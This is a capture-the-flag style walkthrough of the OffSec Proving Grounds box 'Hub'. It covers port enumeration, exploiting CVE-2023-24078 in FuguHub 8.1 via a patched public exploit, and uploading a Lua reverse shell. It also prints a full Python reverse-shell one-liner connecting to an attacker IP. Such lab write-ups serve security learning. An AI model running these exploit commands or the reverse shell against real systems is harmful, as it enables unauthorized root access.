# Hub — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Intermediate
**OS:** Linux

---

## TL;DR

FuguHub 8.1 CVE-2023-24078 RCE → Lua reverse shell upload → instant root shell (FuguHub runs as root).

---

## Enumeration

```bash
sudo nmap -sC -p- -n -Pn -sV --min-rate=9362 192.168.183.25 -oN nmap.txt
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.4p1 Debian |
| 80 | HTTP | nginx 1.18.0 (403 Forbidden) |
| 8082 | HTTP | Barracuda Embedded Web Server (WebDAV) |
| 9999 | HTTPS | Barracuda Embedded Web Server (FuguHub) |

Port 80 gives us a 403, but ports 8082 and 9999 are running **FuguHub** — a web-based file server powered by the Barracuda Embedded Web Server. The WebDAV scan shows some risky methods: `PUT, DELETE, MOVE, MKCOL`.

---

## Exploitation — CVE-2023-24078 (FuguHub RCE)

Found an exploit for **FuguHub 8.1**: [EDB-51550](https://www.exploit-db.com/exploits/51550) — CVE-2023-24078.

The first attempt fails because the exploit has **hardcoded port numbers and incorrect paths**. After reviewing the source code and fixing it:
- Updated the login endpoint to use port 8082
- Fixed the file server path
- Ensured the reverse shell upload URL is correct

The exploit works by:
1. Creating an admin account (if none exists) or logging in
2. Uploading a **Lua reverse shell** (.lsp file) to the file server
3. Triggering the shell by requesting the uploaded file

```bash
python3 51550.py -r 192.168.183.25 -rp 8082 -l 192.168.45.230 -p 80
```

We get an initial shell, but it's limited. Upgrade to a full reverse shell:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.230",6969));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
```

The best part? FuguHub runs as **root**, so **no privilege escalation needed**. 🎉

---

## Key Takeaways

- **FuguHub CVE-2023-24078** — always review exploit code when it fails; hardcoded values often need adjusting
- **Lua reverse shells** are used for Barracuda/FuguHub since they use the Lua Server Pages (.lsp) format
- Services that run as root give you instant priv esc — check `whoami` immediately after getting a shell
- WebDAV methods like `PUT` are strong indicators of file upload capabilities

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
